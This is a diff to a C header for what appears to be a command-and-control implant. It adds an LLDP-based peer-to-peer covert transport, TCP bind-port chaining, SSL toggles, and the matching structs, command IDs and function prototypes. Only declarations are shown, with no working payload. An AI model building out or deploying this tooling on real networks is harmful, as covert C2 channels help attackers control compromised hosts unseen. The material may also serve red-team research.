@@ -62,6 +62,32 @@
 #ifndef CFG_SLEEP_JITTER
 #define CFG_SLEEP_JITTER 0
 #endif
+#ifndef CFG_USE_SSL
+#define CFG_USE_SSL 1
+#endif
+
+/* P2P transport config (set by builder for LLDP_TRANSPORT / TCP_TRANSPORT) */
+#ifndef CFG_LLDP_IFACE
+#define CFG_LLDP_IFACE "eth0"
+#endif
+#ifndef CFG_LLDP_OUI_0
+#define CFG_LLDP_OUI_0 0x00
+#endif
+#ifndef CFG_LLDP_OUI_1
+#define CFG_LLDP_OUI_1 0x00
+#endif
+#ifndef CFG_LLDP_OUI_2
+#define CFG_LLDP_OUI_2 0x0C
+#endif
+#ifndef CFG_LLDP_SUBTYPE
+#define CFG_LLDP_SUBTYPE 0x01
+#endif
+#ifndef CFG_LLDP_PEER_IP
+#define CFG_LLDP_PEER_IP ""
+#endif
+#ifndef CFG_TCP_BIND_PORT
+#define CFG_TCP_BIND_PORT 7000
+#endif
 
 /* ================================================================
  *  PROTOCOL CONSTANTS
@@ -87,6 +113,7 @@
 #define DOWNLOAD_RESP_CMD  0x2C
 
 #define C2_PROFILE_TCP     0x01
+#define C2_PROFILE_LLDP    0x02
 
 /* ================================================================
  *  COMMAND IDs
@@ -141,6 +168,10 @@
 #define SOCKS_RECV_BUF     65536
 #define TCP_P2P_MAX_LINKS  8
 #define TCP_RECV_BUF_MAX   65536
+#define LLDP_MAX_LINKS     8
+
+#define CMD_LLDP_CONNECT    0x70
+#define CMD_LLDP_DISCONNECT 0x71
 
 /* ================================================================
  *  TLV TYPES
@@ -177,6 +208,21 @@ typedef struct {
     int      active;
     int      connected;
 } proxy_conn_t;
+
+typedef struct lldp_link {
+    char     task_uuid[40];
+    char     agent_id[40];
+    uint32_t link_id;
+    uint8_t  peer_mac[6];
+    int      connected;
+    uint32_t rx_msg_id;
+    uint16_t rx_total;
+    uint16_t rx_received;
+    uint8_t  *rx_chunks[256];
+    uint16_t rx_chunk_lens[256];
+    uint8_t  rx_chunk_present[256];
+    struct lldp_link *next;
+} lldp_link_t;
 
 typedef struct tcp_link {
     char     task_uuid[40];
@@ -218,8 +264,9 @@ typedef struct {
     uint32_t killdate;
     int      running;
 
-    /* transport - HTTPS */
+    /* transport - HTTPS / HTTP */
     SSL_CTX *ssl_ctx;
+    int      use_ssl;
     char     callback_host[256];
     int      callback_port;
     char     post_uri[256];
@@ -255,6 +302,20 @@ typedef struct {
     tcp_link_t *tcp_links;
     int         tcp_listen_sock;
     int         tcp_listen_port;
+
+    /* LLDP P2P links */
+    lldp_link_t *lldp_links;
+    int          lldp_sock;
+    int          lldp_ifindex;
+    uint8_t      lldp_oui[3];
+    uint8_t      lldp_subtype;
+    uint8_t      lldp_src_mac[6];
+    char         lldp_iface[32];
+    uint8_t      lldp_peer_mac[6];
+    int          lldp_has_peer;
+
+    /* P2P child transport (parent connection) */
+    int          p2p_parent_sock;
 
     /* job tracking */
     job_entry_t jobs[MAX_JOBS];
@@ -312,6 +373,23 @@ int tcp_p2p_link_send(tcp_link_t *link, const uint8_t *data, uint32_t len);
 int tcp_p2p_link_recv(int sock, uint8_t **data, uint32_t *len);
 void cmd_connect_handler(const char *task_uuid, parser_t *params);
 void cmd_disconnect_handler(const char *task_uuid, parser_t *params);
+
+/* ================================================================
+ *  LLDP P2P FUNCTIONS (transport_lldp.c)
+ * ================================================================ */
+void lldp_p2p_poll_links(void);
+void lldp_p2p_destroy(void);
+int  lldp_p2p_link_send(lldp_link_t *link, const uint8_t *data, uint32_t len);
+void cmd_lldp_connect_handler(const char *task_uuid, parser_t *params);
+void cmd_lldp_disconnect_handler(const char *task_uuid, parser_t *params);
+int  lldp_p2p_child_init(void);
+uint8_t *lldp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len);
+
+/* ================================================================
+ *  TCP P2P CHILD FUNCTIONS (transport_tcp.c)
+ * ================================================================ */
+int  tcp_p2p_child_accept(void);
+uint8_t *tcp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len);
 
 /* ================================================================
  *  RESPONSE QUEUE (main.c)
